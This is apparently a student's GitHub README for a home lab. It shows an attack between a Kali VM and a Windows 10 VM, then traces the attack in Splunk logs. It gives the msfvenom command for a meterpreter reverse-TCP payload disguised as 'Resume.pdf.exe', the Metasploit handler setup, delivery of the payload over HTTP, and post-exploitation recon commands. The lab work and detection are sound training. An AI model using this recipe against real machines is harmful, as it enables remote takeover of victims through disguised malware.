# Simulating Cyber Attacks and Log Analysis with VirtualBox and Splunk

## Objective
The project aimed to create a simulated network attack environment using VirtualBox to connect a Windows 10 VM (victim) and a Kali Linux VM (attacker). The primary goal was to execute an attack and analyze the resulting logs with Splunk to understand attack patterns and enhance network security skills.

### Skills Learned

- **Virtual Machine Management:** Setting up and managing virtual machines using Oracle VM VirtualBox.
- **Penetration Testing:** Using Metasploit for vulnerability exploitation and payload delivery.
- **Malware Creation:** Ability to create and deploy custom malware using 'msfvenom' with a reverse TCP payload.
- **SIEM Log Analysis:** Using Splunk for log ingestion, querying, and analysis to detect and investigate suspicious activities.
- **Command-Line Proficiency:** Executing various command-line tools and utilities on both Windows and Linux platforms.
- **Cybersecurity Concepts:** Understanding of attack vectors, defense mechanisms, and network security best practices.

### Tools Used

- Virtualization Software: Oracle VM VirtualBox
- Operating Systems: Windows 10 (Victim) and Kali Linux (Attacker)
- Security Tools: Metasploit Framework, Nmap, Splunk
- Networking: Internal Network Configuration in VirtualBox

## Steps

1. **Network Configuration**:
     * Set both VMs to use an internal network for isolated communication.
     * Verify the connection between the virtual machines using the ping command.
  
2. **Scanning for Open Ports**:
   * On Kali, ran 'Nmap -A 192.168.20.10 -Pn'. This command performs an aggressive scan (-A) on the target IP without pinging the host first (-Pn). It detects open ports, services, OS details, and potential vulnerabilities.
   * After running the command, identified that port 3389 (RDP) is open.

   ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/02ae843a11ce0da73895b2bf4bae0e7cce666d24/Project%20Images/Screenshot%202024-06-28%20131152.png)

3. **Creating Malware**:
     * Used msfvenom to create a malware payload with command 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe'.
     * This command generates a Windows executable (-f exe) with a reverse TCP payload that causes the Windows machine to connect back to the attacker's IP on port 4444, and outputs it as 'Resume.pdf.exe'.

     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/dc126819e54bc31e9c6ad753d6717cc188d76ed8/Project%20Images/Screenshot%202024-06-28%20135945.png)


4. **Setting Up Metasploit Handler**:
     * Opened 'msfconsole' and configured a handler to listen for incoming connections. Achieved this by using command 'use/exploit/multi/handler' and set the payoad and LHOST/LPORT to match the malware configuration.
     * By setting up a metasploit handler, you set up a listener that waits for the victim's machine to connect back to the attacker's machine. This connection is established when the victim executes the malware, allowing the attacker to gain control over the victim's machine through a Meterpreter session.
   
    ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/a14a72e9e432c9ff5b108cdcbaabd5fbb2aca154/Project%20Images/Screenshot%202024-06-28%20211123.png)
    ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/a14a72e9e432c9ff5b108cdcbaabd5fbb2aca154/Project%20Images/Screenshot%202024-06-28%20212126.png)

5. **Delivering Malware**:
     * Set up a simple HTTP server on Kali for file delivery using 'python3 -m http.server 9999'.
     * On Windows VM, disabled antivirus, navigated to the Kali IP on port 9999, downloaded, and executed the malware.

     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/3ab03dea89bf80ece7dd3bf85ad93ff1da2bf86a/Project%20Images/Screenshot%202024-06-28%20214054.png)
     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/3ab03dea89bf80ece7dd3bf85ad93ff1da2bf86a/Project%20Images/WindowsVM%20(current)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox%206_23_2024%205_47_05%20PM.png)

6. **Verifying The Established Connection**:
     * To verify that the malware executed correctly and that there's an established connection between the client and attacker we can use the command 'netstat -anob'. This command will show you a list of all active network connections. Furthermore, we can see an established connection from the client to the attacker through the "Resume.pdf.exe" file.
     * We can also verify through Task Manager. We see that "Resume.pdf.exe" is running through PID:8028. 

     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/fef68f7ed68eb29b9525a952c1d0836e00828928/Project%20Images/WindowsVM%20(current)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox%206_23_2024%209_56_44%20PM.png)
     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/fef68f7ed68eb29b9525a952c1d0836e00828928/Project%20Images/WindowsVM%20(current)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox%206_23_2024%209_58_09%20PM.png)

7. **Exploiting the Victim Machine**:
     * On Kali, used Meterpreter’s 'shell' command to gain a shell on the Windows VM.
     * Ran 'net user', 'net localgroup', and 'ipconfig' to gather information. Respectively, the commands will list all user accounts on the Windows VM, list all local groups and their members, and display network configuration details.

     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/f053a13068332649f02c6543458fd8c8083022d9/Project%20Images/kali-linux-2024.2-virtualbox-amd64%20(Baseline)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox%206_23_2024%209_59_08%20PM.png)
     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/f053a13068332649f02c6543458fd8c8083022d9/Project%20Images/kali-linux-2024.2-virtualbox-amd64%20(Baseline)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox%206_23_2024%209_59_50%20PM.png)     

8. **Log Analysis**:
     * Within Splunk Enterprise, querying 'index=endpoint' in the "Search & Reporting" section will show all the data ingested into the environment. Additionally, querying 'index=endpoint 192.168.20.11' showed that the attacker targeted one destination port which is port 3389 (RDP)
     * Querying 'index=endpoint Resume.pdf.exe' will show various event codes, the first event code shows "Resume.pdf.exe" spawning cmd and executing 'net user', 'net localgroup', and 'ipconfig' commands.

     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/6c9575c4efdf422e237e928ac97a2c9de5820ffc/Project%20Images/Screenshot%202024-06-29%20201028.png)
     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/6c9575c4efdf422e237e928ac97a2c9de5820ffc/Project%20Images/Screenshot%202024-06-29%20201210.png)

## Conclusion
Through this project, I gained hands-on experience in setting up a virtualized network environment and conducting a simulated cyber attack. I developed skills in network configuration, penetration testing with Metasploit, and log analysis with Splunk. This project enhanced my understanding of network security, attack patterns, and defensive strategies, providing valuable insights into the practical aspects of cybersecurity.
